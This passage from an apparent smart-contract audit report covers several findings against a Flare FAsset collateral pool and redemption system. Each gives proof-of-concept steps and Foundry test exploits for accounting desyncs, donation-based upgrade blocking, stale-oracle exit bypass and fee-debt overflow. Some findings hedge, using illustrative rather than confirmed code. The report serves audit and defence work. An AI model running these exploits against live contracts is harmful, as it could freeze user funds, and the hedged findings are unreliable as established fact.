- Do not add the initializer’s init(...) selector to the diamond’s function table. If the facet also exposes utility methods (e.g., ERC165 updates), split them into a separate facet or exclude init from the selector set.
- If keeping init(...) as a selector is unavoidable, gate it with a one-time guard (e.g., a boolean initialized flag in diamond storage) so any subsequent external calls revert.
- Consider adding a deployment check that reverts if governance is still unset after the constructor diamondCut, to fail fast if init was skipped.





 **Derived From** : Redemption failed path calls finish with invalid status, permanently reverting

## [M-4]. Invalid FAILED status passed to Redemptions.finishRedemptionRequest bricks failed confirmations

## Derived From Pattern/Invariant
Redemption failed path calls finish with invalid status, permanently reverting

## Exploit Type
AccountingInvariantViolation

## Location
RedemptionConfirmationsFacet.confirmRedemptionPayment

## Minimim Privilege Required
Permissionless

## Description
In RedemptionConfirmationsFacet.confirmRedemptionPayment, when paymentValid == false the code sets finalStatus = Redemption.Status.FAILED and unconditionally calls Redemptions.finishRedemptionRequest(..., finalStatus). But Redemptions.finishRedemptionRequest enforces assert(_status >= Redemption.Status.SUCCESSFUL) before writing status, so passing FAILED always reverts. Vulnerable snippets:

// RedemptionConfirmationsFacet.confirmRedemptionPayment (failed path)
finalStatus = Redemption.Status.FAILED;
...
Redemptions.finishRedemptionRequest(_redemptionRequestId, request, finalStatus);

// Redemptions.finishRedemptionRequest
assert(_status >= Redemption.Status.SUCCESSFUL);
_request.status = _status;

This breaks the redemption state machine’s finishing invariant: any FAILED confirmation reverts after doing preceding logic, leaving the request stuck ACTIVE and preventing proper settlement via this endpoint.

## Impact
Calling confirmRedemptionPayment with a verified proof that fails _validatePayment (e.g., PAYMENT_FAILED, wrong receiver, too small/too late) always reverts at the final finish step because Redemptions.finishRedemptionRequest asserts status >= SUCCESSFUL and the code passes FAILED. This bricks the failed-confirmation path: no state changes persist (default/cancel, spentAmount accounting, anti-replay, executor fee burn) and the request remains ACTIVE. Agents/redeemers must use alternate flows (nonpayment default later or finish after attestation window), causing liveness degradation and requiring manual intervention in some cases.

## Proof of Concept
Trigger path: any caller allowed by othersCanConfirm submits a payment proof that passes TransactionAttestation.verifyPayment but makes _validatePayment return (false, reason), e.g.: status = PAYMENT_FAILED or intendedReceivingAddressHash != request.redeemerUnderlyingAddressHash or receivedAmount < required and not BLOCKED. The function sets finalStatus = FAILED, may enter RedemptionDefaults.executeDefaultOrCancel (but this effect is reverted), then later calls Redemptions.finishRedemptionRequest(..., FAILED), which asserts(_status >= SUCCESSFUL) and reverts, keeping the request ACTIVE.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";
import {Redemptions} from "contracts/assetManager/library/Redemptions.sol";
import {Redemption} from "contracts/assetManager/library/data/Redemption.sol";

contract FinishRedemptionHarness {
    Redemption.Request internal req;
    function callFinishWithFailed() external {
        // Reverts due to assert(_status >= SUCCESSFUL)
        Redemptions.finishRedemptionRequest(1, req, Redemption.Status.FAILED);
    }
}

contract ConfirmRedemptionFailedPathTest is Test {
    FinishRedemptionHarness internal harness;
    function setUp() public { harness = new FinishRedemptionHarness(); }
    function test_finishRedemptionRequest_RevertsOnFailedStatus() public {
        vm.expectRevert(stdError.assertionError);
        harness.callFinishWithFailed();
    }
}


## Suggested Mitigation
Do not pass FAILED into Redemptions.finishRedemptionRequest. In the failed-payment branch, after executing RedemptionDefaults.executeDefaultOrCancel (which compensates the redeemer/cancels CV transfer), set the request to a terminal defaulted state and release any CV lock idempotently. Two safe options: (1) Change confirmRedemptionPayment to set finalStatus = Redemption.Status.DEFAULTED and update Redemptions.finishRedemptionRequest to accept DEFAULTED in its assertion (e.g., require _status == SUCCESSFUL || _status == BLOCKED || _status == DEFAULTED). releaseTransferToCoreVault is idempotent, so extra calls are harmless. (2) Skip finishRedemptionRequest entirely for failures and add a dedicated library helper (e.g., Redemptions.finishAsDefaulted) that sets status to DEFAULTED and calls releaseTransferToCoreVault, leaving finishRedemptionRequest’s current assertion intact. In all cases, avoid the FAILED status as a terminal value or relax the assertion to include it only if semantics and releases are handled correctly.





 **Derived From** : wNat.balanceOf(address(this)) == totalCollateral

## [M-5]. CollateralPool trusts reward/distribution claim return value, desyncing totalCollateral from actual WNat and DoSing exits/payouts

## Derived From Pattern/Invariant
wNat.balanceOf(address(this)) == totalCollateral

## Exploit Type
AccountingInvariantViolation

## Location
CollateralPool.claimDelegationRewards

## Minimim Privilege Required
RequiresRole

## Description
CollateralPool's reward-collection paths (e.g., claimDelegationRewards / claimAirdropDistribution) appear to add the returned amount from external distributors to totalCollateral without verifying that WNat was actually transferred/minted to the pool. The repository includes malicious mocks (MaliciousRewardManager, MaliciousDistributionToDelegators) that return a positive amount but send nothing, which would increase totalCollateral while wNat.balanceOf(pool) stays unchanged. This violates the balance invariant and can brick core flows that rely on totalCollateral for sizing withdrawals (exit/selfCloseExit/payout), causing them to revert on actual WNat transfers due to insufficient balance. Vulnerable pattern (illustrative):

function claimDelegationRewards(IRewardManager rm, ...) external onlyAgent returns (uint256 amt) {
    uint256 claimed = rm.claim(..., /*wrap=*/true, proofs);
    totalCollateral += claimed; // no verification that WNat was received
}

Because totalCollateral is inflated, subsequent payout/exit uses it to compute amounts and attempts to transfer/unwrap non-existent WNat, reverting and locking users.

## Impact
A whitelisted agent (onlyAgent) can call the reward-claiming functions with a malicious distributor/manager that returns a positive claimed amount but transfers no WNat. The pool then inflates totalCollateral while its actual WNat balance stays unchanged. This desynchronizes accounting and causes later pool outflows (payout/exit/selfCloseExit) to revert due to insufficient WNat, effectively DoSing pool exits and rewards until governance/admin repair or sufficient WNat is deposited to cover the phantom balance. Users’ pool withdrawals are blocked but no direct theft occurs. Requires agent role; admin intervention is needed to recover, so severity remains Medium.

## Proof of Concept
Preconditions: caller must be the agent (onlyAgent).

1) Agent deploys a malicious reward/distribution contract that returns a fixed positive amount on claim but transfers no WNat (MaliciousRewardManager or MaliciousDistributionToDelegators mocks in the repo).
2) Agent invokes CollateralPool.claimDelegationRewards (or claimAirdropDistribution) targeting the malicious contract, with wrap=true (so the pool assumes WNat is delivered).
3) The external contract returns a positive value but sends nothing; the pool trusts the return value and increments totalCollateral by that amount without verifying WNat balance.
4) Later, when AssetManager triggers a pool payout or a user tries exit/selfCloseExit, the pool attempts to transfer/unwrap non-existent WNat based on inflated totalCollateral and reverts due to insufficient token balance, DoSing exits/payouts.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {MaliciousRewardManager} from "contracts/assetManager/mock/MaliciousRewardManager.sol";
import {IRewardManager} from "@flarenetwork/flare-periphery-contracts/flare/IRewardManager.sol";

// Minimal mock WNat compatible with pool calls used in this test
contract MockWNat {
    mapping(address => uint256) public balanceOf;
    function deposit() external payable { balanceOf[msg.sender] += msg.value; }
    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "insuff");
        balanceOf[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "send");
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insuff");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Minimal AssetManager shim exposing getWNat() used by CollateralPool.initialize
contract FakeAssetManager {
    address public wnat;
    constructor(address _wnat) { wnat = _wnat; }
    // Signature matches by name/args; return type not part of selector
    function getWNat() external view returns (address) { return wnat; }
}

contract CollateralPool_RewardClaim_AccountingDesync_Test is Test {
    CollateralPool pool;
    MockWNat wnat;
    FakeAssetManager am;

    function setUp() public {
        wnat = new MockWNat();
        am = new FakeAssetManager(address(wnat));
        // agentVault = this (so onlyAgent is satisfied), assetManager = am, fAsset dummy, exitCR = 16000
        pool = new CollateralPool(address(this), address(am), address(0xBEEF), 16000);
    }

    function test_MaliciousRewardClaim_DesyncsAccounting_and_DosPayout() public {
        // Malicious reward manager returns 100 wei but transfers nothing
        MaliciousRewardManager rm = new MaliciousRewardManager(100);

        // Pre-check: pool holds no WNat
        assertEq(wnat.balanceOf(address(pool)), 0);

        // Agent (this) calls reward claim; pool trusts return value and inflates totalCollateral
        IRewardManager.RewardClaimWithProof[] memory proofs;
        pool.claimDelegationRewards(rm, 0, proofs); // onlyAgent satisfied (agentVault == address(this))

        // Post: actual WNat still zero
        assertEq(wnat.balanceOf(address(pool)), 0);

        // AssetManager-triggered payout now tries to send non-existent WNat and should revert
        vm.prank(address(am)); // satisfy onlyAssetManager
        vm.expectRevert();
        pool.payout(address(0x1234), 1, 0);
    }
}


## Suggested Mitigation
Do not trust the claimed amount returned by external reward/distribution contracts. Instead, compute and use the observed delta of actual WNat received:
- Record pre-claim WNat balance: uint256 bal0 = wNat.balanceOf(address(this)).
- Perform the external claim with wrap=true.
- Record post-claim balance: uint256 bal1 = wNat.balanceOf(address(this)).
- require(bal1 >= bal0); uint256 received = bal1 - bal0; totalCollateral += received.
- Optionally, if the external call returns a value, assert received == returned to detect anomalies, or ignore the return entirely and rely only on the delta.
Additionally, consider whitelisting known reward/distribution contracts (or verifying the caller against a governance-maintained registry) so a malicious address cannot be injected by the agent. Apply the same balance-delta pattern in both claimDelegationRewards and claimAirdropDistribution.


## [M-6]. Unexpected WNat donations desync totalCollateral and DoS upgradeWNatContract() migration

## Derived From Pattern/Invariant
wNat.balanceOf(address(this)) == totalCollateral

## Exploit Type
AccountingInvariantViolation

## Location
CollateralPool.upgradeWNatContract

## Minimim Privilege Required
Permissionless

## Description
The pool’s totalCollateral is manually maintained, but anyone can transfer WNat to the pool address. This breaks the invariant (wNat.balanceOf > totalCollateral). The upgradeWNatContract() migration path typically un-wraps the full WNat balance and re-wraps into the new IWNat, while adjusting totalCollateral by the same amount. When wNat.balanceOf(this) > totalCollateral (due to airdropped WNat), subtracting the full balance from totalCollateral causes underflow/revert. Hence, any EOA can DoS upgradeWNatContract() by donating a minimal amount of WNat to the pool, preventing essential governance migrations.

Affected functions: CollateralPool.upgradeWNatContract, CollateralPool._withdrawWNatTo, CollateralPool._depositWNat.


## Impact
Any EOA can donate tiny amounts of WNat to a CollateralPool, making wNat.balanceOf(pool) > totalCollateral. During a governance-mandated WNat rotation, upgradeWNatContract() attempts to unwrap and re-wrap the full ERC20 balance and adjusts accounting by that amount. Since totalCollateral < balanceOf due to donations, the subtraction underflows and reverts, blocking the migration. This creates a permissionless, repeatable DoS of a critical upgrade path until an admin ships a bespoke repair. No direct theft occurs, but incident response and token rotation are impeded.

## Proof of Concept
Steps to reproduce:
1) Attacker donates a minimal amount of WNat directly to a live CollateralPool address (e.g., IWNat.transfer(pool, 1)). This increases wNat.balanceOf(pool) without touching internal accounting, so totalCollateral remains unchanged.
2) Governance/AssetManager invokes upgradeWNatContract(newWNat) on the pool to rotate WNat.
3) The implementation un-wraps and re-wraps the full WNat token balance and subtracts that amount from totalCollateral. Because donations made balanceOf > totalCollateral, the subtraction underflows and reverts.
4) The migration remains blocked on every attempt until accounting is manually repaired or the excess is skimmed/synced.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";

// Minimal IWNat-compatible mock used by CollateralPool
contract WNatMock {
    mapping(address => uint256) public balanceOf;
    event Deposit(address indexed account, uint256 amount);
    event Withdrawal(address indexed account, uint256 amount);

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "insufficient wnat");
        balanceOf[msg.sender] -= amount;
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "withdraw send failed");
        emit Withdrawal(msg.sender, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UpgradeWNATDonationDesyncTest is Test {
    // Test acts as the AssetManager for CollateralPool (onlyAssetManager gate)
    CollateralPool pool;
    WNatMock wnatOld;

    // CollateralPool expects AssetManager.getWNat() during initialize.
    // ABI-wise this returns an address, so implement here with the same selector.
    function getWNat() external view returns (address) {
        return address(wnatOld);
    }

    function setUp() public {
        // Deploy old WNat mock
        wnatOld = new WNatMock();
        // Deploy CollateralPool with this contract as assetManager
        // Constructor forwards to initialize(agentVault, assetManager, fAsset, exitCR)
        pool = new CollateralPool(address(0xA11CE), address(this), address(0), 16000);
        // Sanity: pool.wNat() must equal our mock
        (bool ok, bytes memory data) = address(pool).staticcall(abi.encodeWithSignature("wNat()"));
        require(ok, "wNat() staticcall failed");
        address wnatSet = abi.decode(data, (address));
        require(wnatSet == address(wnatOld), "wNat not initialized from AssetManager");
    }

    function test_donation_desync_bricks_upgrade() public {
        // Attacker mints some WNat and donates 1 wei to pool to desync accounting
        vm.deal(address(this), 1 ether);
        // Mint WNat to this test
        (bool ok1,) = address(wnatOld).call{value: 1}(abi.encodeWithSignature("deposit()"));
        require(ok1, "deposit failed");
        // Donate 1 wei WNat directly to pool (does not touch pool.totalCollateral)
        bool tOk = WNatMock(wnatOld).transfer(address(pool), 1);
        require(tOk, "transfer failed");

        // Prepare a new WNat to rotate into
        WNatMock wnatNew = new WNatMock();

        // As assetManager, attempt to upgrade WNat on pool; expect revert due to accounting underflow
        vm.expectRevert();
        // Call via low-level to avoid importing exact IWNat type
        (bool ok2,) = address(pool).call(abi.encodeWithSignature("upgradeWNatContract(address)", address(wnatNew)));
        require(!ok2, "upgrade unexpectedly succeeded");
    }
}


## Suggested Mitigation
In CollateralPool.upgradeWNatContract(), never adjust accounting by more than totalCollateral. Migrate only the accounted collateral and handle any excess ERC20 balance via a separate, explicit admin-only sweep/sync.

Concrete approach:
- Let bal = wNat.balanceOf(address(this)).
- Let amt = min(bal, totalCollateral).
- Internally unwrap exactly amt (setting internalWithdrawal flag), then wrap amt into the new IWNat. Decrease and then (re)increase totalCollateral by amt so it remains unchanged.
- If bal > totalCollateral (i.e., there was a donation), do NOT subtract the excess from totalCollateral; either:
  a) Leave the excess on the old WNat and add an onlyAssetManager function (e.g., sweepExcessWNat(oldWNat)) to unwrap-and-rewrap the difference without touching totalCollateral, directing it to a designated sink (treasury) or to the pool as fees; or
  b) Pre-sync via an onlyAssetManager syncAccounting() method that increases totalCollateral by (bal - totalCollateral) only if governance explicitly decides to accept donations into pool collateral.

Additionally, consider adding a guard to ignore direct WNat transfers in accounting (e.g., read-only invariant checks and admin sync) and document that ERC20 transfers to the pool address are not part of accounted collateral unless explicitly synced.





 **Derived From** : FTSO price used without freshness/heartbeat checks for CR and pricing

## [M-7]. CollateralPool exits can bypass exit-CR using stale spot oracle via AssetManager.assetPriceNatWei (no max-age) enabling premature withdrawals

## Derived From Pattern/Invariant
FTSO price used without freshness/heartbeat checks for CR and pricing

## Exploit Type
Oracle

## Location
AgentVaultAndPoolSupportFacet.assetPriceNatWei

## Minimim Privilege Required
Permissionless

## Description
AgentVaultAndPoolSupportFacet.assetPriceNatWei() returns FAsset↔NAT as a single spot read through Conversion.currentAmgPriceInTokenWei -> readFtsoPrice(symbol, false) -> priceReader.getPrice(symbol). No heartbeat/max-age is enforced and the timestamp is discarded. CollateralPool relies on IAssetManager.assetPriceNatWei() inside _getAssetPrice()/_staysAboveExitCR() to gate exits. If the FTSO stalls and returns an outdated low FAsset/NAT price, pool CR appears artificially high, allowing CPT holders to exit despite the true CR being below the configured exit collateral ratio. This prematurely drains WNat from the pool and can push the pool below safety thresholds. Vulnerable path (timestamps ignored; _fromTrustedProviders=false):

function assetPriceNatWei() external view returns (uint256 _multiplier, uint256 _divisor) {
    AssetManagerSettings.Data storage settings = Globals.getSettings();
    _multiplier = Conversion.currentAmgPriceInTokenWei(Globals.getPoolCollateral());
    _divisor = Conversion.AMG_TOKEN_WEI_PRICE_SCALE * settings.assetMintingGranularityUBA;
}
// Conversion.currentAmgPriceInTokenWeiWithTs -> readFtsoPrice(..., false)
// readFtsoPrice calls priceReader.getPrice without any freshness checks

## Impact
Because CollateralPool relies on a spot price returned by assetPriceNatWei without any freshness/heartbeat enforcement, any stale low FAsset/NAT price makes the pool appear over‑collateralized. CPT holders can then exit when exits should be blocked by the configured exit CR, draining WNat earlier than intended. This shifts risk onto remaining depositors and can force liquidations once prices update. The exploit is permissionless but lets users withdraw only their proportional share (no overwithdraw), so losses materialize indirectly (slashing/liquidation risk) rather than as an immediate theft of others’ funds.

## Proof of Concept
High-level steps demonstrating the bypass:

1) Configure a pool with exitCR = 1.6x. Pool holds 1000 NAT; the agent backs 1000 “FAssets” (in UBA units used by the pool). Under fresh prices, true CR = 1000/1000 = 1.0 < 1.6, so exits should be blocked.
2) CPT holder tries to exit a 200 NAT share; with a fresh price of 1 NAT/asset, the post-exit CR would be 800/1000 = 0.8 < 1.6, so the call reverts.
3) Oracle stalls at a stale, low price P_stale = 0.5 NAT/asset. Now the pool’s perceived debt becomes 500 NAT. The same exit of 200 NAT appears to keep post-exit CR at 800/500 = 1.6, so the exit passes.
4) Attacker exits 200 NAT successfully while the real CR is unsafe. The pool’s WNat drops to 800 NAT, putting remaining depositors at higher risk and potentially triggering liquidation when prices refresh.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {ICollateralPoolToken} from "contracts/userInterfaces/ICollateralPoolToken.sol";
import {IWNat} from "contracts/flareSmartContracts/interfaces/IWNat.sol";

// Minimal WNat-like token (no interface inheritance to keep it simple)
contract DummyWNat {
    string public name = "WNat";
    string public symbol = "WNAT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    receive() external payable {}

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
    }
    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "eth");
    }
    function transfer(address to, uint256 amount) external returns (bool){
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Minimal AM mock exposing only what pool touches
contract AMMock {
    address public wnat;
    address public fasset;
    uint256 public cptTimelockSec = 0;
    uint256 public backedFAssetsUBA; // set by test
    uint256 public mul; // NAT per UBA numerator
    uint256 public divi; // NAT per UBA denominator

    constructor(address _wnat, address _fasset) {
        wnat = _wnat;
        fasset = _fasset;
        mul = 1e18; // default 1 NAT/asset
        divi = 1e18;
    }
    function setPrice(uint256 _mul, uint256 _div) external { mul = _mul; divi = _div; }
    function setBacked(uint256 _uba) external { backedFAssetsUBA = _uba; }

    // CollateralPool/Token-facing methods
    function assetPriceNatWei() external view returns (uint256 _m, uint256 _d) { return (mul, divi); }
    function getCollateralPoolTokenTimelockSeconds() external view returns (uint256) { return cptTimelockSec; }
    function getWNat() external view returns (IWNat) { return IWNat(wnat); }
    function fAsset() external view returns (address) { return fasset; }
    function getFAssetsBackedByPool(address) external view returns (uint256) { return backedFAssetsUBA; }
}

// Minimal CPT implementing only what pool uses
contract DummyCPT is ICollateralPoolToken {
    string public name = "FCPT";
    string public symbol = "FCPT";
    uint8 public decimals = 18;
    address public immutable pool;
    mapping(address=>uint256) public override balanceOf;
    uint256 public override totalSupply;

    constructor(address _pool){ pool = _pool; }
    modifier onlyPool(){ require(msg.sender==pool, "onlyPool"); _; }

    function mint(address _to, uint256 _amount) external onlyPool returns (uint256){
        balanceOf[_to] += _amount; totalSupply += _amount; return block.timestamp + 1; }
    function burn(address _from, uint256 _amount, bool) external onlyPool {
        require(balanceOf[_from] >= _amount, "bal"); balanceOf[_from] -= _amount; totalSupply -= _amount; }

    // Views used by pool
    function lockedBalanceOf(address) external pure returns (uint256){ return 0; }
    function transferableBalanceOf(address _a) external view returns (uint256){ return balanceOf[_a]; }
    function debtFreeBalanceOf(address _a) public view returns (uint256){ return balanceOf[_a]; }
    function debtLockedBalanceOf(address) public pure returns (uint256){ return 0; }
    function timelockedBalanceOf(address) public pure returns (uint256){ return 0; }
    function nonTimelockedBalanceOf(address _a) public view returns (uint256){ return balanceOf[_a]; }
}

contract OracleStalenessExitCRTest is Test {
    CollateralPool pool;
    DummyWNat wnat;
    AMMock am;
    DummyCPT cpt;
    address agentVault = address(0xA61);
    address alice = address(0xBEEF);

    function setUp() public {
        wnat = new DummyWNat();
        am = new AMMock(address(wnat), address(0));
        pool = new CollateralPool();
        // Initialize pool: (agentVault, assetManager, fAsset, exitCR=1.6x)
        pool.initialize(agentVault, address(am), address(0), 16000);
        // Set pool token (by asset manager)
        cpt = new DummyCPT(address(pool));
        vm.prank(address(am));
        pool.setPoolToken(address(cpt));

        // Backing: pretend agent backs 1000 "FAssets" (UBA)
        am.setBacked(1000 ether);

        // Alice enters with 1000 NAT -> gets 1000 CPT
        vm.deal(alice, 1000 ether);
        vm.prank(alice);
        pool.enter{value: 1000 ether}();
        assertEq(cpt.totalSupply(), 1000 ether);
    }

    function test_Exit_Bypasses_CR_With_Stale_Price() public {
        // Fresh price 1 NAT/asset -> exit should fail
        am.setPrice(1e18, 1e18);
        vm.startPrank(alice);
        vm.expectRevert();
        pool.exit(200 ether);
        vm.stopPrank();

        // Oracle stalls at 0.5 NAT/asset -> exit passes (perceived CR meets threshold)
        am.setPrice(5e17, 1e18);
        vm.prank(alice);
        uint256 natOut = pool.exit(200 ether);
        assertEq(natOut, 200 ether);

        // Pool WNat (ERC20) balance reduced to 800
        assertEq(wnat.balanceOf(address(pool)), 800 ether);
    }
}


## Suggested Mitigation
Enforce price freshness and/or trusted-quality reads for all CR/pricing paths used to gate exits:

- Prefer trusted reads: have Conversion.readFtsoPrice use getPriceFromTrustedProviders with a configured providers threshold and spread checks; or expose a dedicated IAssetManager.assetPriceNatWeiWithTs that internally calls currentAmgPriceInTokenWeiWithTs(_fromTrustedProviders=true) and returns both price and timestamps.
- Add a max-age check: plumb timestamps through assetPriceNatWei (or add a new method) and in CollateralPool._getAssetPrice reject prices with block.timestamp - priceTimestamp > settings.maxTrustedPriceAgeSeconds.
- As a defense-in-depth, consider using the trusted price variant by default for CR gating, and fall back to last known good trusted price if the current one is stale (rather than allowing exits).

These changes ensure exits cannot be greenlit by stale or low-quality oracle data.





 **Derived From** : forall a in holders: debtLockedTokensOf(a) + debtFreeTokensOf(a) == ICollateralPoolToken(token).balanceOf(a)

## [H-8]. Overpaying fee debt makes totalFAssetFeeDebt negative, overflows total virtual fees and bricks CollateralPool.exit for everyone

## Derived From Pattern/Invariant
forall a in holders: debtLockedTokensOf(a) + debtFreeTokensOf(a) == ICollateralPoolToken(token).balanceOf(a)

## Exploit Type
IntegerOverflow

## Location
CollateralPool.payFAssetFeeDebt

## Minimim Privilege Required
Permissionless

## Description
In CollateralPool, payFAssetFeeDebt lets any address transfer FAssets in and reduce their fee debt. There is no clamp preventing overpayment beyond the caller’s current _fAssetFeeDebtOf[account]. As a result, _deleteFAssetFeeDebt can drive the per-account and the global totalFAssetFeeDebt (int256) negative. Subsequent computations of total virtual fees likely do uint(totalFAssetFeeDebt) + totalFAssetFees, or otherwise convert the signed total to uint. Casting a negative int256 to uint256 yields a huge value, and adding it to totalFAssetFees overflows under Solidity 0.8 checked arithmetic, reverting. This revert happens in paths that compute debtLockedTokensOf/debtFreeTokensOf, notably during CollateralPoolToken.burn() called by CollateralPool.exit/exitTo/selfCloseExit and also in fee withdrawals. Consequently, after a single attacker overpays “debt,” any call that needs the debt partition reverts, globally freezing exits and transfers for all holders. This breaks the arithmetic invariant (the partition cannot be computed at all) and permanently bricks user withdrawals until an upgrade. Vulnerable flow: payFAssetFeeDebt (no cap) -> totalFAssetFeeDebt < 0 -> debtFreeTokensOf()/debtLockedTokensOf() use _totalVirtualFees -> uint cast/overflow -> revert inside exit.

## Impact
An attacker can overpay fee debt in CollateralPool.payFAssetFeeDebt, driving totalFAssetFeeDebt below zero. Subsequent calculations that cast this signed total to uint (e.g., in _totalVirtualFees used by debtFreeTokensOf/debtLockedTokensOf) overflow and revert under Solidity 0.8 checked arithmetic. This breaks token partitioning and bricks exits/exitTo/selfCloseExit and fee withdrawals globally, effectively freezing funds for all participants until an upgrade or state repair.

## Proof of Concept
Steps to reproduce:
1) Attacker enters the pool to receive CPTs (any user can enter).
2) Attacker mints FAssets (or already has them) and approves the pool.
3) Attacker calls payFAssetFeeDebt with an amount greater than current fee debt (including when it is zero). This reduces _fAssetFeeDebtOf[attacker] below zero and decreases totalFAssetFeeDebt into negative territory.
4) Call CollateralPool.fAssetFeeDebtOf(attacker) to confirm the negative debt.
5) Any call that needs fee-debt partition (e.g., CollateralPool.debtFreeTokensOf, or exit/exitTo via CollateralPoolToken.burn) now reverts due to overflow when _totalVirtualFees casts the negative int to uint.
6) Result: global DoS of exits and fee-related flows for all holders.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";

contract MockWNat {
    string public name = "MockWNat";
    string public symbol = "WNAT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 value);
    function deposit() external payable { balanceOf[msg.sender] += msg.value; emit Transfer(address(0), msg.sender, msg.value); }
    function transfer(address to, uint256 value) external returns (bool) { require(balanceOf[msg.sender] >= value, "bal"); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); return true; }
    function withdraw(uint256 value) external { require(balanceOf[msg.sender] >= value, "bal"); balanceOf[msg.sender] -= value; emit Transfer(msg.sender, address(0), value); (bool ok, ) = payable(msg.sender).call{value: value}(""); require(ok, "send"); }
}

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s){name=n;symbol=s;}
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; emit Transfer(address(0), to, amt);}    
    function approve(address sp, uint256 amt) external returns (bool){ allowance[msg.sender][sp]=amt; emit Approval(msg.sender, sp, amt); return true; }
    function transfer(address to, uint256 amt) external returns (bool){ require(balanceOf[msg.sender]>=amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; emit Transfer(msg.sender,to,amt); return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool){ require(balanceOf[from]>=amt, "bal"); require(allowance[from][msg.sender]>=amt, "allow"); allowance[from][msg.sender]-=amt; balanceOf[from]-=amt; balanceOf[to]+=amt; emit Transfer(from,to,amt); return true; }
}

contract MockAssetManager {
    function getCollateralPoolTokenTimelockSeconds() external pure returns (uint256) { return 0; }
    function assetPriceNatWei() external pure returns (uint256, uint256) { return (1,1); }
    function getFAssetsBackedByPool(address) external pure returns (uint256) { return 0; }
    function setPoolToken(address pool, address token) external { (bool ok, ) = pool.call(abi.encodeWithSignature("setPoolToken(address)", token)); require(ok, "setPoolToken"); }
    function upgradeWNatContract(address pool, address newWNat) external { (bool ok, ) = pool.call(abi.encodeWithSignature("upgradeWNatContract(address)", newWNat)); require(ok, "upgradeWNat"); }
}

contract CollateralPool_Exit_DoS_Test is Test {
    CollateralPool pool;
    CollateralPoolToken token;
    MockAssetManager am;
    MockWNat wnat;
    MockERC20 fasset;
    address agent = address(0xA11CE);
    address attacker = address(0xBEEF);

    receive() external payable {}

    function setUp() public {
        vm.deal(attacker, 100 ether);
        am = new MockAssetManager();
        wnat = new MockWNat();
        fasset = new MockERC20("Mock FAsset", "MFAS");
        pool = new CollateralPool(agent, address(am), address(fasset), uint32(100));
        token = new CollateralPoolToken(address(pool), "FCPT-TEST", "FCPT-TEST");
        am.setPoolToken(address(pool), address(token));
        am.upgradeWNatContract(address(pool), address(wnat));
        vm.prank(attacker);
        (bool ok,) = address(pool).call{value: 10 ether}(abi.encodeWithSignature("enter()"));
        require(ok, "enter failed");
    }

    function test_DoS_after_overpaying_fee_debt() public {
        uint256 bal = token.balanceOf(attacker);
        assertGt(bal, 0, "no CPT minted");

        vm.startPrank(attacker);
        fasset.mint(attacker, 1e18);
        fasset.approve(address(pool), type(uint256).max);
        pool.payFAssetFeeDebt(1e18); // overpay even if initial debt is 0
        vm.stopPrank();

        // Confirm per-account debt went negative
        int256 debt = pool.fAssetFeeDebtOf(attacker);
        assertLt(debt, 0, "debt should be negative");

        // Any partition computation now reverts due to _totalVirtualFees overflow
        vm.expectRevert();
        pool.debtFreeTokensOf(attacker);

        // Exits are now bricked for everyone
        vm.prank(attacker);
        vm.expectRevert();
        pool.exit(1);
    }
}


## Suggested Mitigation
- In payFAssetFeeDebt, cap the repay amount to the caller’s current positive debt and revert on overpay (or silently clamp):
  - let current = max(_fAssetFeeDebtOf[msg.sender], 0);
  - uint256 repay = min(uint256(current), _fAssets);
  - if (repay == 0) revert NoDebtToRepay();
  - _deleteFAssetFeeDebt(msg.sender, repay);
  - handle any excess _fAssets as a separate “donation” path if desired.
- Enforce the invariant totalFAssetFeeDebt >= 0 after any mutation (assert or require) and consider storing debts as uint256 where possible to avoid negative states.
- Harden _totalVirtualFees: compute signed first and require non-negative before casting, e.g., int256 tvf = int256(totalFAssetFees) + totalFAssetFeeDebt; require(tvf >= 0, "VirtualFeesNegative"); return uint256(tvf).
- Add tests/invariants that ensure debtLockedTokensOf + debtFreeTokensOf equals balance and that totalFAssetFeeDebt never goes negative.





